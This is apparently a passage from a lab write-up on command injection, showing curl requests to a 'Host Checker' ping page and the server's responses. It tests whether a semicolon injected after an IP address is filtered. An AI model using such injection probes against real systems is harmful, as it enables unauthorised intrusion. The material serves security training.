# Filter Detection

## First Attempt

```sh
my@attack:~$ curl -s 'http://94.237.52.18:31462' -X POST -d 'ip=127.0.0.1'
```

```html title="Output" hl_lines="23-28"
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Host Checker</title>
  <link rel="stylesheet" href="./style.css">

</head>

<body>
  <div class="main">
    <h1>Host Checker</h1>

    <form method="post" action="">
      <label>Enter an IP Address</label>
      <input type="text" name="ip" placeholder="127.0.0.1" pattern="^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$">
      <button type="submit">Check</button>
    </form>

    <p>
    <pre>
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.011 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.011/0.011/0.011/0.000 ms
</pre>
    </p>

  </div>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js'></script>

</body>

</html>
```

## Blacklisted Character

```sh
my@attack:~$ curl -s 'http://94.237.52.18:31462' -X POST -d 'ip=127.0.0.1%3B'
```

```html title="Output" hl_lines="23"
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Host Checker</title>
  <link rel="stylesheet" href="./style.css">

</head>

<body>
  <div class="main">
    <h1>Host Checker</h1>

    <form method="post" action="">
      <label>Enter an IP Address</label>
      <input type="text" name="ip" placeholder="127.0.0.1" pattern="^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$">
      <button type="submit">Check</button>
    </form>

    <p>
    <pre>
Invalid input</pre>
    </p>

  </div>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js'></script>

</body>

</html>
```
